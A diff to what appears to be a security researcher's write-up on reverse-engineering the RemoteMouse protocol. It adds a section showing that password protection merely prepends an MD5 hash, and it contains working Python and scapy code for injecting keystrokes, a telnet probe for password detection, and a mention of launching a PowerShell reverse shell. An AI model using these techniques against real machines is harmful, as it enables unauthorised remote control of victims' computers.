@@ -361,7 +361,7 @@ Alright cool, so if we send information to the server that starts with "key" we 
 
 So how can we exploit this? Essentially, I want a way to run arbitrary commands on a RemoteMouse server from my computer, so let's build a Python function that will construct a list of strings that will execute what we want it to execute.
 
-To start off, let's go with the trivial single character injection; we do this by navigating to the code path with the "[ras]" substring detection. Looking at how the data is parsed when we first hit the wire (in the `Form1.b` method), the data takes the form of `key <len>[<fmt>]data`. In this case, we want the `ras` format for single character keystroke injection (don't ask me what the "ras" means), and we already know how they convert the characeters using the XOR-encryption.
+To start off, let's go with the trivial single character injection; we do this by navigating to the code path with the "[ras]" substring detection. Looking at how the data is parsed when we first hit the wire (in the `Form1.b` method), the data takes the form of `key <len>[<fmt>]data`. In this case, we want the `ras` format for single character keystroke injection (don't ask me what the "ras" means), and we already know how they convert the characters using the XOR-encryption.
 
 ```python
 def char2pkt(s: str) -> str:
@@ -374,7 +374,8 @@ def char2pkt(s: str) -> str:
     :rtype: str
     """
     i = ord(s) ^ 53
-    return "key 7[ras]{}".format(i)
+    rhs = "[ras]{}".format(i)
+    return "key  {}{}".format(len(rhs), rhs)
 ```
 
 Nice! Well, looking ahead, what do we actually want to type out for an example exploit? How about opening up powershell to get a reverse-shell callback. To do this, we'll need two special packets, and then just a bunch of ASCII. So let's start out with the two special characters: `WIN+R` and `ENTER`.
@@ -444,3 +445,66 @@ for pkt in pkts:
 ```
 
 It works! Something important to note is that there seems to be a small race condition when you send too many keystrokes too close together, so I spaced them out with a small timer. I also had a hard time getting Powershell to give me a reverse-shell for some reason, but I did get the TCP callback to my netcat listener, I suspect it was just Windows being Windows.
+
+## Passwords
+
+It looks like in the FAQ for Remote Mouse, they explain that a password can be set to prevent others from using your computer:
+
+> Click Remote Mouse icon on the taskbar (top right corner on Mac, bottom right corner on PC), choose Settings" -> Set password for your computer -> Apply
+
+When you set a password, during the TCP handshake, the "nop" strings are replaced with a "pwd" strings. Interesting, looks like this is just to signify the app to enter a password. Actually getting the server and app to agree on a password took a lot of work. Every time you reset or set a password, you have to restart the server, and even then it seems like you have to do it a few more times for it to actually work. I set the password to `PAssword` and started inspecting the traffic again.
+
+So a password handshake looks like this (these are hexdumps of the data field of the TCP packets)
+
+Server -> App
+```
+0000   53 49 4e 20 31 35 77 69 6e 20 70 77 64 20 70 77   SIN 15win pwd pw
+0010   64 20 33 30 30                                    d 300
+```
+
+App -> Server
+```
+0000   63 69 6e 30 33 36 31 64 38 62 65 38 34 30 37 33   cin0361d8be84073
+0010   64 61 39 37 66 36 32 64 66 36 31 32 33 64 35 30   da97f62df6123d50
+0020   64 31 32 38 36 65 20 32 34 30                     d1286e 240
+```
+
+Server -> App
+```
+0000   63 69 6e 20 20 37 73 75 63 63 65 73 73            cin  7success
+```
+
+Now if we try sending a keystroke from the phone we get this:
+```
+0000   62 36 30 63 66 38 62 61 37 65 35 64 61 62 34 62   b60cf8ba7e5dab4b
+0010   33 62 36 62 65 64 37 38 62 64 65 31 65 34 37 30   3b6bed78bde1e470
+0020   6b 65 79 20 20 37 5b 72 61 73 5d 38 34            key  7[ras]84
+```
+
+Wait a minute... Is that an MD5 Hash in front of the plain-text single-key packet?
+
+![That's Suspicious](https://media.tenor.com/images/6f934479914fbd708238bab284eeff0a/tenor.gif)
+
+Let's do some work in CyberChef real quick:
+
+ - [Detect the Hash type](https://gchq.github.io/CyberChef/#recipe=Analyse_hash()&input=YjYwY2Y4YmE3ZTVkYWI0YjNiNmJlZDc4YmRlMWU0NzA)
+ - [Hash our password (`PAssword`) with that hash](https://gchq.github.io/CyberChef/#recipe=MD5()&input=UEFzc3dvcmQ)
+
+
+Okay, so their idea of encrypting the communications _isn't_ actually encrypted a packet, it's prepending the MD5 hash of the password to the beginning of the packet. Let's make sure this works using scapy:
+
+```python
+>>> time.sleep(5); send(IP(dst="192.168.86.195")/UDP(dport=1978)/Raw(load="b60cf8ba7e5dab4b3b6bed78bde1e470key  7[ras]87"))
+.
+Sent 1 packets.
+```
+
+Lo and behold, a single 'b' was typed into my computer. I tried changing the hash to see what would happen, but that didn't work unfortunately. So if the traffic is encrypted, all we really have to do is either bruteforce the hash, or sniff out someone else's traffic. And to determine if a server is using a password, we can simply open up a TCP connection with them and see the response:
+
+```bash
+$ telnet 192.168.86.195 1978
+Trying 192.168.86.195...
+Connected to 192.168.86.195.
+Escape character is '^]'.
+SIN 15win pwd pwd 300^CConnection closed by foreign host.
+```
